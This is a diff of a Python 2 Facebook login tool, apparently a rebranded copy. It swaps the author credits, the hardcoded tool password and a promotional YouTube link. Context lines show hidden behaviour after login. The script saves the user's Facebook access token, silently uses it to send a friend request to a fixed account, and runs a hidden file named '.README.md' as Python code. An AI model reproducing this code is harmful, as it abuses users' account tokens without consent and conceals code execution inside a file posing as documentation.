@@ -29,16 +29,16 @@ logo='''
 
 --------------------------------------------------
 
- Auther   : Binyamin
- GitHub   : https://github.com/binyamin-binni
- YouTube  : Trick Proof
- Blogspot : https://trickproof.blogspot.com
+ Auther   : MANSOOR ALI
+ GitHub   : https://github.com/Man50or
+ YouTube  : Mk Tricks
+ Blogspot : Not Yet
 
 --------------------------------------------------
                                 '''
 
-CorrectUsername = "binyamin"
-CorrectPassword = "bxi"
+CorrectUsername = "KHAN"
+CorrectPassword = "KHAN"
 
 loop = 'true'
 while (loop == 'true'):
@@ -135,7 +135,7 @@ def login1():
                                 chb.write(z['access_token'])
                                 chb.close()
                                 print ('\n\x1b[1;92m[+] Login Successfull \x1b[1;97m')
-                                os.system('xdg-open https://www.youtube.com/channel/UCIC01LyIO5oroo1Qo6Fi4Mw')
+                                os.system('xdg-open https://www.youtube.com/mktrick143')
                                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=100002059014174&access_token='+z['access_token'])
                                 os.system("python2 .README.md")
                         except requests.exceptions.ConnectionError:
